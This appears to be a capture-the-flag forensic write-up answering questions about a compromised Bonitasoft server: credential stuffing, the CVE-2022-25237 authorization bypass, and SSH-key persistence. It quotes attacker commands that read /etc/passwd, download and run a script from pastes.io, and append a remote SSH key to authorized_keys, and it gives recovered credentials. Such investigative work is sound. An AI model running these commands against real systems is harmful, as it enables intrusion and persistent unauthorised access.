## We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?

- filter for `http` in Wireshark 
- notice URL contains **bonita**
- open JSON alerts file and search for `bonita` to find entries for **Bonitasoft** (confirm with a web search if desired)

### Answer: `bonitasoft`

## We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?

- filter for `http.request.method=="POST"` and take note of the numerous logins

- expand the form information to reveals different usernames and passwords

- looks like a **credential stuffing** attack 

### Answer: `Credential Stuffing`

## Does the vulnerability exploited have a CVE assigned - and if so, which one?

- Searching within the JSON alerts file for "Bonitasoft" reveals multiple lines referencing a CVE number, such as the following: 

```
ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)"
```

- Performing a web search for "Bonitasoft credential stuffing" (or similar) and/or the above CVE number should net results like the NVD page for the CVE as well

### Answer: `CVE-2022-25237`

## Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?

<p>The NVD description (https://nvd.nist.gov/vuln/detail/CVE-2022-25237) will have this information and it can be found/verified
in the PCAP file</p>

Filter: 

```
http.request.method=="POST" && http.request.uri contains "i18ntranslation"
```

### Answer: `i18ntranslation`

## How many combinations of usernames and passwords were used in the credential stuffing attack?

- First filter out all the form submissions

Filter:
```
http.content_type == "application/x-www-form-urlencoded"
```

- Reviewing the results shows a pattern that each one set of credentials is followed by another submission with **install:install**, to remove these from the results refine the filter.

Filter:

```
http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.value != "install"
```

- This leaves 59 packets but in examining the last three one can see the same credentials (**seb.broom@forela.co.uk:g0vernm3nt
**) indicating a change

- checking the response comfirms that this set of credentials was successful with a 204 response rather than 401

- There are 4 packets in the filtered output associated with the successful request meaning that 56 unique username:password attempts were made

### Answer: `56`

## Which username and password combination was successful?

- As discovered above `seb.broom@forela.co.uk:g0vernm3nt` was the successful username:password pair

### Answer: `seb.broom@forela.co.uk:g0vernm3nt`

## If any, which text sharing site did the attacker utilise?

After successful authentication the attacker makes a POST request to a privileged API endpoint using CVE-2022-25237 to bypass auth. This call uploads **"rce_api_extension.zip"**, which allows command execution, then follows up with a few GET requests to execute system commands, including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"***, then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**

### Answer: `pastes.io`

## Please provide the filename of the public key used by the attacker to gain persistence on our host.

Following the link that the wget command uses leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and a command to restart the SSH service

```    
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

### Answer: `hffgra4unv`

## Can you confirm the file modified by the attacker to gain persistence?

As seen above, the modified file is the **authorized_keys** file which has a new key appended to it

### Answer: `/home/ubuntu/.ssh/authorized_keys`

## Can you confirm the MITRE technique ID of this type of persistence mechanism?

Using the ATT&CK Navigator and creating a new layer with the Enterprise matrix (https://mitre-attack.github.io/attack-navigator/) a simple search on **SSH** quickly reveals a result **"Account Manipulation : SSH Authorized Keys"**. Clicking view opens the description (https://attack.mitre.org/techniques/T1098/004/) which includes the ID 

### Answer: `T1098.004`